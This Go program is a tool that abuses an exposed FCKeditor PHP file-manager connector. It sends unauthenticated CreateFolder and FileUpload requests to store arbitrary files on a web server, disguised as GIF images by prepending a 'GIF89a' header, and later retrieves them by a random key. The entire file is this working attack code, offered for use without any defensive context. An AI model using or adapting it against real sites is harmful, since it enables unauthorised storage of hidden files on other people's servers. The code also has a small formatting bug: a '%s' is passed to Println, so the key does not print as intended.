package main

import (
  "bytes"
  "flag"
  "fmt"
  "io"
  "io/ioutil"
  "log"
  "math/rand"
  "mime/multipart"
  "net/http"
  "os"
  "time"
)

const endpoint string = "https://localhost/"
const connector string = "fckeditor/editor/filemanager/connectors/php/connector.php?Type=Media&CurrentFolder="
const newFolder string = "&Command=CreateFolder&NewFolderName="
const upload string = "&Command=FileUpload"
const handle string = "userfiles/media/"

func uploadFile(uri string, filepath string, key string) {
  file, err := os.Open(filepath)
  if err != nil {
    log.Fatalln(err)
  }
  defer file.Close()

  b := &bytes.Buffer{}
  w := multipart.NewWriter(b)
  p, _ := w.CreateFormFile("NewFile", key+".gif")
  fmt.Fprint(p, "GIF89a;\n") // The GIF89a header is 8 bytes
  io.Copy(p, file)
  w.Close()

  req, _ := http.NewRequest("POST", uri, b)
  req.Header.Add("Content-Type", w.FormDataContentType())

  client := &http.Client{}
  client.Do(req)
}

func main() {
  rand.Seed(time.Now().UnixNano())
  get := flag.Bool("get", false, "Retrieve file by supplying key")
  flag.Parse()
  args := flag.Args()
  if len(args) != 1 {
    log.Fatalln("A filepath or a key (for retrieval) must be supplied")
  }
  if *get {
    key := args[0]
    r, err := http.Get(fmt.Sprintf("%s%s%s/%s.gif", endpoint, handle, key, key))
    if err != nil {
      log.Fatalln(err)
    }
    defer r.Body.Close()
    body, err := ioutil.ReadAll(r.Body)
    if err != nil {
      log.Fatalln(err)
    }
    fmt.Println(string(body[8:]))
  } else {
    var alphabet = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_")
    s := make([]rune, 16)
    for i := range s {
      s[i] = alphabet[rand.Intn(64)]
    }
    key := string(s)
    http.Get(endpoint + connector + newFolder + key)
    uploadFile(endpoint+connector+key+upload, args[0], key)
    fmt.Println("Key: %s", key)
  }
}
